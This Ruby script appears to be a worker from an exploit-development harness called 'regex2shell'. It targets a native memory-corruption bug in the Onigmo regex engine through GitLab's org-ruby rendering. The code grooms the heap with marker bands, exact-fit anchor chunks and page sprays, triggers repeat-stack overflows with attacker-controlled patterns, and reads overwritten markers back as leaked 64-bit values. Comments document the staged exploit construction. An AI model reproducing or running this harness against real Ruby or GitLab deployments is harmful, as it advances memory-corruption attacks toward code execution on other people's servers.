#!/usr/bin/env ruby
# regex2shell disposable worker — one process per request.
#
# Exit codes: 0 = OK, 3 = RegexpError/SyntaxError (clean rejection),
# 4 = other Ruby-level error, signal (6/11/...) = native Onigmo crash ([BUG]).
#
# Modes:
#   org  — stdin: raw .org content; renders it with org-ruby (the GitLab sink)
#   re   — stdin: JSON {pattern: String, match: bool, subject: String?};
#          compiles the pattern (Regexp.new) and optionally matches it.
#          This is the engine-level probe path (what GitLab does with
#          attacker-controlled regexp source).
$stdin.binmode
mode = ARGV[0]
input = $stdin.read

begin
  case mode
  when 'org'
    require 'org-ruby'
    html = Orgmode::Parser.new(input).to_html
    puts html
  when 're'
    require 'json'
    req = JSON.parse(input)
    pattern = req.fetch('pattern')
    markers = nil
    if (groom = req['groom_markers'])
      # heap groom: small marker strings live in the brk heap, below the
      # engine's match-time allocations — the request-body grooming analog
      n, sz = Integer(groom[0]), Integer(groom[1])
      markers = Array.new(n) { 'M' * sz }
      GC.start
    end
    t0 = Process.clock_gettime(Process::CLOCK_MONOTONIC)
    re = Regexp.new(pattern)
    compile_ms = ((Process.clock_gettime(Process::CLOCK_MONOTONIC) - t0) * 1000).round

    # post-compile groom (stage-3 construction):
    #   band        — post-compile marker band ('M'*4096 each): exhausts the
    #                 compile-freed brk holes and bump-extends the heap so the
    #                 band top ends contiguous right below the anchor
    #   anchor_fit  — exact-fit anchor (chunk class == repeat_stk's 0x40020):
    #                 the last big allocation before the match, freed with two
    #                 full GCs; repeat_stk reuses the hole (glibc best-fit), so
    #                 every wrapped repeat id writes into the band below it
    #   (fillers/page_spray/anchor are the earlier stage-3 iterations, kept
    #   for reproducing those runs)
    fillers = req['fillers']&.map { |f| 'F' * Integer(f) }
    band = nil
    if (bn = req['band'])
      band = Array.new(Integer(bn)) { 'M' * 4096 }
      GC.start
    end
    sprayed = nil
    if (ps = req['page_spray'])
      sprayed = Array.new(Integer(ps)) { 'p' * 10 }
      GC.start
    end
    if (fit = req['anchor_fit'])
      af = 'A' * Integer(fit)
      af = nil
      GC.start(full_mark: true, immediate_sweep: true)
      GC.start(full_mark: true, immediate_sweep: true)
    end
    if (anchor = req['anchor'])
      # earlier iteration: freed mmap hole directly below the newest heap
      # page (superseded by anchor_fit — the anchor here was never actually
      # collected before the match; see odd/tasks L14)
      a = 'A' * Integer(anchor)
      a = nil
      GC.start
    end
    Regexp.timeout = Float(req['timeout']) if req['timeout']
    result = nil
    begin
      if req['match']
        m = re.match(req.fetch('subject', ''))
        result = { matched: !m.nil?, preview: m&.to_s&.[](0, 64) }
      end
    rescue Regexp::TimeoutError
      result = { interrupted: 'timeout' }
    end
    out = { status: 'compiled', source_bytes: pattern.bytesize,
           compile_ms: compile_ms, match: result }
    if markers
      hits = []
      markers.each_with_index do |mk, i|
        if (j = mk.index(/[^M]/))
          hits << { marker: i, offset: j, value: mk[j, 8].unpack1('Q<') }
        end
      end
      out[:groom_hits] = hits
      out[:groom_total] = markers.size
    end
    if band
      bhits = []
      band.each_with_index do |mk, i|
        if (j = mk.index(/[^M]/))
          bhits << { marker: i, offset: j, value: mk[j, 8].unpack1('Q<') }
        end
      end
      out[:band_hits] = bhits
      out[:band_total] = band.size
    end
    if sprayed
      changed = []
      sprayed.each_with_index do |s, i|
        changed << { i: i, len: s.length } if s.length != 10
      end
      out[:page_hits] = changed
      out[:page_total] = sprayed.size
    end
    fillers = nil
    puts JSON.generate(out)
  else
    warn "unknown mode #{mode}"
    exit 4
  end
rescue RegexpError, SyntaxError => e
  warn "#{e.class}: #{e.message}"
  exit 3
rescue Exception => e
  warn "#{e.class}: #{e.message}"
  warn e.backtrace&.first(5).to_s
  exit 4
end
